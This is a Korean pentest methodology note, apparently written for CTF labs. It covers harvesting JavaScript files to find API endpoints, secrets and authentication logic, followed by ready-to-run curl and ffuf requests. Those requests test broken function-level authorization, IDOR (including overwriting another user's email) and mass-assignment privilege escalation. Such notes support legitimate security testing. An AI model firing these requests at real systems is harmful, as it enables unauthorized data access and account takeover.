# 07_JS분석_API추출

## 07_JS분석_API추출

웹 디렉터리 탐색으로 /js 경로 발견 시 JS 파일 안에 API 엔드포인트, 인증 방식, admin 전용 라우트, 하드코딩된 시크릿 등이 노출되는 경우가 많다. gobuster 결과에서 /js가 보이면 바로 분석에 들어가야 한다. React, Vue, Angular 같은 SPA 프레임워크 기반 앱은 모든 라우트와 API 호출이 JS 번들 파일 안에 다 들어있기 때문에 반드시 분석해야 한다. 특히 minified JS라도 grep과 전용 도구로 엔드포인트, 시크릿, 인증 방식을 충분히 추출할 수 있다.

---

### JS 파일 찾기

HTML 소스에서 script 태그를 파싱해서 로드되는 JS 파일 목록을 먼저 파악해야 한다. gobuster만으로는 동적으로 생성된 파일명이나 해시가 붙은 번들 파일을 못 잡는 경우가 있기 때문이다. 여러 페이지에서 각각 확인해야 admin 전용 JS 파일을 놓치지 않는다.

```bash
# HTML 소스에서 JS 파일 경로 추출
curl -s http://<IP>/ | grep -Eo 'src="[^"]+\.js[^"]*"' | sort -u
curl -s http://<IP>/ | grep -Eo "src='[^']+\.js[^']*'" | sort -u

# 서브페이지도 각각 확인해야 한다
curl -s http://<IP>/login | grep -Eo 'src="[^"]+\.js[^"]*"' | sort -u
curl -s http://<IP>/admin | grep -Eo 'src="[^"]+\.js[^"]*"' | sort -u

# gobuster로 /js 디렉터리 탐색
gobuster dir -u http://<IP>/js/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x js \
  -t 10 \
  --timeout 20s \
  -b 404,400 \
  -o gobuster-js.txt

# gospider로 크롤링하면서 JS 파일 전부 수집
gospider -s http://<IP>/ --js -t 10 -d 2 --sitemap --robots -o gospider-out
grep -Eo "(http|https)://[^/\"'].*\.js+" gospider-out/* | sort -u

# katana로 JS 파일 포함 전체 URL 수집
katana -u http://<IP>/ -jc -kf all -ef woff,css,png,svg,jpg,woff2,jpeg,gif -o katana-out.txt
grep "\.js" katana-out.txt | sort -u

# subjs로 JS 파일만 추출
echo "http://<IP>/" | subjs
```

---

### JS 파일 다운로드 및 전처리

분석은 로컬에서 해야 grep이 편하다. 파일을 전부 같은 디렉터리에 받아놓고 한번에 분석해야 한다. minified JS는 한 줄로 압축되어 있어서 가독성이 떨어지기 때문에 prettier로 포맷팅한 후 분석해야 한다.

```bash
mkdir -p js-analysis && cd js-analysis

curl -s http://<IP>/js/app.js -o app.js
curl -s http://<IP>/js/admin.js -o admin.js
curl -s http://<IP>/js/main.js -o main.js
curl -s http://<IP>/js/chunk-vendors.js -o chunk-vendors.js

# minified JS 포맷팅 (가독성 향상)
npm install -g prettier
prettier --write *.js

# 또는 js-beautify 사용
pip install jsbeautifier
js-beautify app.js -o app-pretty.js

# source map 파일이 있으면 원본 소스코드 복원이 가능하다
# main.js.map 파일이 있으면 개발자 IDE 수준으로 복원된다
npm install -g source-map-explorer
source-map-explorer main.js main.js.map
```

---

### API 엔드포인트 추출 — grep

엔드포인트 추출이 핵심이다. /api/v1, /api/v2 처럼 버전이 나뉘는 경우 구버전에 인증이 없는 경우가 많으므로 버전별로 전부 추출해야 한다.

```bash
# /api 경로 전체 추출
grep -RhoE "/api/[A-Za-z0-9_./?&=%:{}-]+" *.js | sort -u

# http/https 포함된 전체 URL 추출
grep -RhoE "https?://[A-Za-z0-9_./?&=%:{}-]+" *.js | sort -u

# fetch, axios 호출 위주로 추출
grep -RhoE "(fetch|axios\.get|axios\.post|axios\.put|axios\.delete|axios\.patch)\(['\"][^'\"]+['\"]" *.js | sort -u

# route, path, endpoint, baseURL 키워드 주변 추출
grep -Ri "route\|path\|endpoint\|baseURL\|api_url\|API_URL\|BASE_URL" *.js

# v1, v2 버전별 엔드포인트만 추출
grep -RhoE "/api/v[0-9]+/[A-Za-z0-9_./?&=%:{}-]+" *.js | sort -u

# GraphQL 엔드포인트 확인
grep -Ri "graphql\|gql\|query\|mutation\|subscription" *.js | sort -u

# WebSocket 엔드포인트 확인
grep -Ri "ws://\|wss://\|WebSocket\|socket\.io" *.js | sort -u

# 숨겨진 파라미터 추출
grep -RhoE "[?&][A-Za-z0-9_-]+=?" *.js | sort -u
```

---

### API 엔드포인트 추출 — 전용 도구

grep보다 훨씬 정확하고 누락 없이 엔드포인트를 추출할 수 있다. 반드시 LinkFinder와 함께 사용해야 한다.

```bash
# LinkFinder 설치
git clone https://github.com/GerbenJavado/LinkFinder.git
cd LinkFinder
pip3 install -r requirements.txt
python3 setup.py install

# 단일 JS 파일 분석
python3 linkfinder.py -i http://<IP>/js/app.js -o cli

# 로컬 JS 파일 전체 분석
python3 linkfinder.py -i 'js-analysis/*.js' -o cli | sort -u

# /api/ 로 시작하는 엔드포인트만 필터
python3 linkfinder.py -i 'js-analysis/*.js' -r ^/api/ -o cli | sort -u

# 결과를 HTML로 저장
python3 linkfinder.py -i 'js-analysis/*.js' -o results.html

# 도메인 전체 크롤링하면서 JS 분석
python3 linkfinder.py -i http://<IP>/ -d -o cli | sort -u

# GoLinkFinder (Go 버전, 더 빠름)
go install github.com/0xsha/GoLinkFinder@latest
GoLinkFinder -target http://<IP>/js/app.js

# SecretFinder — 엔드포인트 + 시크릿 동시 추출
git clone https://github.com/m4ll0k/SecretFinder.git
python3 SecretFinder.py -i http://<IP>/js/app.js -o cli
python3 SecretFinder.py -i 'js-analysis/*.js' -o cli
```

---

### 인증 방식 파악

인증 방식을 파악해야 토큰을 어떻게 탈취하거나 위조할지 알 수 있다. JWT면 시크릿 키 확보 후 위조가 가능하고, 쿠키 기반이면 HttpOnly 여부에 따라 XSS로 탈취 가능 여부가 갈린다.

```bash
# JWT, Bearer 토큰 처리 방식 확인
grep -Ri "Authorization\|Bearer\|token\|jwt\|localStorage\|sessionStorage" *.js

# 토큰 저장 위치 확인 (localStorage에 저장하면 XSS로 탈취 가능하다)
grep -Ri "localStorage\.setItem\|localStorage\.getItem\|sessionStorage\.setItem" *.js

# JWT 토큰 하드코딩 여부 확인
grep -RhoE "eyJ[a-zA-Z0-9-_=]+?\.[a-zA-Z0-9-_=]+\.?[a-zA-Z0-9-_.+/=]*" *.js >> jwt-found.txt

# Authorization 헤더 구성 방식 확인
grep -Ri "headers\|Authorization\|Bearer" *.js

# 토큰 갱신 로직 확인
grep -Ri "refresh\|expire\|renew\|reissue" *.js

# 쿠키 관련 처리 확인
grep -Ri "cookie\|PHPSESSID\|session" *.js
```

---

### Admin 전용 라우트 파악

admin 전용 라우트가 프론트엔드에서만 숨겨져 있고 백엔드에서 인가 검증이 없는 경우가 많다. 발견한 admin 엔드포인트는 일반 유저 토큰으로 전부 시도해야 한다.

```bash
# admin 관련 경로, 조건 확인
grep -Ri "admin\|role\|isAdmin\|permission\|privilege\|superuser\|moderator" *.js

# 프론트엔드 라우트 가드 확인 (우회 가능한지 파악해야 한다)
grep -Ri "router\|guard\|redirect\|canActivate\|beforeEach\|requiresAuth\|meta\.auth" *.js

# 버전 차이 확인 (v1 vs v2)
grep -RhoE "/api/v[0-9]+" *.js | sort -u

# 숨겨진 기능, 디버그 모드 확인
grep -Ri "debug\|hidden\|disabled\|todo\|fixme\|hack\|internal" *.js
```

---

### 하드코딩된 시크릿 확인

개발자가 테스트 편의를 위해 JS 파일에 API 키나 비밀번호를 하드코딩하는 경우가 있다. 프론트엔드 JS는 클라이언트에 그대로 노출되기 때문에 반드시 확인해야 한다.

```bash
# API 키, 시크릿, 비밀번호 하드코딩 여부 확인
grep -Ri "secret\|password\|passwd\|apikey\|api_key\|private_key\|credential\|access_token" *.js

# AWS 관련 키 확인
grep -RhoE "AKIA[0-9A-Z]{16}" *.js
grep -Ri "aws_access_key\|aws_secret\|s3\.amazonaws" *.js

# Google API 키 확인
grep -RhoE "AIza[0-9A-Za-z\-_]{35}" *.js >> secrets.txt

# Stripe 키 확인
grep -RhoE "sk_live_[0-9a-zA-Z]{24}" *.js >> secrets.txt

# 환경변수 하드코딩 여부 확인
grep -Ri "process\.env\|VUE_APP_\|REACT_APP_\|NEXT_PUBLIC_" *.js

# TruffleHog으로 시크릿 자동 탐지
trufflehog filesystem ./js-analysis/

# gf 패턴으로 시크릿 탐지
cat *.js | gf aws-keys
cat *.js | gf base64
cat *.js | gf secrets
```

---

### 추출한 엔드포인트로 해야 할 것

API에서 인증(Authentication)과 인가(Authorization)는 다르다. 인증은 "누구냐"를 확인하는 것이고, 인가는 "뭘 할 수 있냐"를 확인하는 것이다. 개발자가 인증은 구현하면서 인가를 빠뜨리는 경우가 많기 때문에 반드시 직접 시도해봐야 한다. 프론트엔드에서 admin 버튼을 숨겨도 API 엔드포인트 자체는 열려있는 경우가 많다. Intentions 박스에서도 v1 토큰으로 v2 admin 엔드포인트에 접근이 됐던 게 바로 이 케이스다.

```bash
# 일반 유저 토큰으로 admin 엔드포인트 전부 시도해야 한다
# JS에서 추출한 admin 경로 목록
# /api/v2/admin/users
# /api/v2/admin/image/modify
# /api/v2/admin/image/delete

curl -i http://<IP>/api/v2/admin/users \
  -H "Authorization: Bearer <일반유저_TOKEN>" \
  -H "Accept: application/json"
# 200 OK 뜨면 인가 취약점 (BFLA) 확정

# HTTP 메서드 변경 시도 (GET이 막혀도 POST, PUT, DELETE는 될 수 있다)
curl -i -X POST http://<IP>/api/v2/admin/users \
  -H "Authorization: Bearer <일반유저_TOKEN>"
curl -i -X DELETE http://<IP>/api/v2/admin/users/1 \
  -H "Authorization: Bearer <일반유저_TOKEN>"
curl -i -X PUT http://<IP>/api/v2/admin/users/1 \
  -H "Authorization: Bearer <일반유저_TOKEN>"

# ffuf로 추출한 엔드포인트 전체 한번에 검증
ffuf -u http://<IP>/FUZZ \
  -w endpoints.txt \
  -H "Authorization: Bearer <일반유저_TOKEN>" \
  -mc 200,201,204,301,302,500 \
  -o ffuf-authz.json

# HTTP 메서드 전체 퍼징
ffuf -u http://<IP>/api/v2/admin/users \
  -w /usr/share/seclists/Fuzzing/http-request-methods.txt \
  -X FUZZ \
  -H "Authorization: Bearer <일반유저_TOKEN>" \
  -mc 200,201,204,405,500
```

---

### IDOR (Broken Object Level Authorization)

ID 값을 파라미터로 받는 엔드포인트는 반드시 다른 유저의 ID로 바꿔서 시도해야 한다. 서버가 소유권을 검증하지 않으면 다른 유저의 데이터를 조회하거나 수정할 수 있다. 내 ID가 5면 1~4, 6 이상을 전부 시도해봐야 한다.

```bash
# 내 ID가 5일 때 다른 유저 ID로 변경 시도
curl -i http://<IP>/api/v1/user/1 \
  -H "Authorization: Bearer <내_TOKEN>"
curl -i http://<IP>/api/v1/user/2 \
  -H "Authorization: Bearer <내_TOKEN>"

# ffuf로 ID 범위 전체 퍼징
seq 1 100 > ids.txt
ffuf -u http://<IP>/api/v1/user/FUZZ \
  -w ids.txt \
  -H "Authorization: Bearer <내_TOKEN>" \
  -mc 200 \
  -fs 0      # 응답 크기가 0인 건 제외

# POST 바디 안의 ID도 바꿔봐야 한다
curl -i -X POST http://<IP>/api/v1/profile/update \
  -H "Authorization: Bearer <내_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1, "email": "attacker@evil.com"}'
# user_id를 내 것이 아닌 다른 유저로 바꿔서 수정 가능한지 확인
```

---

### Mass Assignment

회원가입이나 프로필 수정 요청에 숨겨진 파라미터를 추가하면 서버가 그대로 DB에 반영하는 경우가 있다. admin, role, isAdmin 같은 파라미터를 추가해서 권한 상승이 가능한지 시도해야 한다.

```bash
# 일반 회원가입 요청
curl -i -X POST http://<IP>/api/v1/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","email":"a@a.com","password":"pass123"}'

# Mass Assignment 시도 (admin, role 파라미터 추가)
curl -i -X POST http://<IP>/api/v1/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","email":"a@a.com","password":"pass123","admin":1,"role":"admin","isAdmin":true}'

# 프로필 수정 요청에도 동일하게 시도
curl -i -X PUT http://<IP>/api/v1/profile \
  -H "Authorization: Bearer <내_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"email":"a@a.com","admin":1,"role":"admin"}'

# Param Miner (Burp 확장) 으로 숨겨진 파라미터 자동 탐지
# Burp → Extensions → BApp Store → Param Miner 설치
# Intruder로 파라미터 퍼징
```